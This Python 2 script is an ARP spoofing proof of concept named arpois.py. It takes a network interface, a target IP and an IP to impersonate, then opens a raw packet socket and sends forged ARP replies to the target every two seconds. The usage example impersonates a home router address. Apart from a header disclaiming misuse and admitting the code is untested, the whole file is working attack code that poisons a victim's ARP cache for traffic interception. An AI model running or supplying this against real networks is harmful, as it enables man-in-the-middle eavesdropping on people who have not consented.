# A proof of concept ARP spoofer by Erethon, please check README.mb and LICENSE files.
# The purpose of this script is stricly educational. It's a proof of concept
# and I haven't really tested, so I don't know if it will work.
# Once again this is to be used for educational purposes only, I am in no way
# responsible for misuse of it.
# Usage: python arpois.py interface target_ip spoofing_ip.


from binascii import unhexlify
import socket
from sys import argv
from time import sleep
from uuid import getnode
from re import search
import subprocess


def get_src_mac():
    mac_dec= hex(getnode())[2:-1]
    while (len(mac_dec) != 12):
        mac_dec="0" + mac_dec
    return unhexlify(mac_dec)


def create_dst_ip_addr():
    dst_ip_addr=''
    ip_src_dec = argv[2]
    ip_src_dec = ip_src_dec.split(".")
    for i in range(len(ip_src_dec)):
        dst_ip_addr += chr(int(ip_src_dec[i]))
    return dst_ip_addr


def get_src_ip_addr():
    src_ip_addr = ''
    ip_src_dec = argv[3].split(".")
    for i in range(len(ip_src_dec)):
        src_ip_addr += chr(int(ip_src_dec[i]))
    return src_ip_addr


def get_dst_mac_addr():
    p = subprocess.Popen(["arping", argv[2] ,"-c", "1"], shell = False, stdout = subprocess.PIPE)
    sleep(2)
    remote_mac = search('(([0-9a-f]{2}:){5}[0-9a-f]{2})',p.communicate()[0])
    return unhexlify(remote_mac.group(0).replace(':',''))


def create_pkt_arp_poison():
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
    s.bind((argv[1], 0))
    src_addr = get_src_mac()
    dst_addr = get_dst_mac_addr()
    src_ip_addr = get_src_ip_addr()
    dst_ip_addr = create_dst_ip_addr()
    dst_mac_addr = "\x00\x00\x00\x00\x00\x00"
    payload = "\x00\x01\x08\x00\x06\x04\x00\x02"
    checksum = "\x00\x00\x00\x00"
    ethertype = "\x08\x06"

    while(1):
        sleep(2)
        s.send(dst_addr+src_addr+ethertype+payload+src_addr+src_ip_addr+dst_mac_addr+dst_ip_addr+checksum)
        print "Sending forged packets to " + argv[2]

if (len(argv) != 4 ):
    print "Usage: python arpois.py interface target_ip spoofing_ip."
    print   "Example: python arpois.py wlan0 192.168.1.42 192.168.1.1"
    exit()

create_pkt_arp_poison()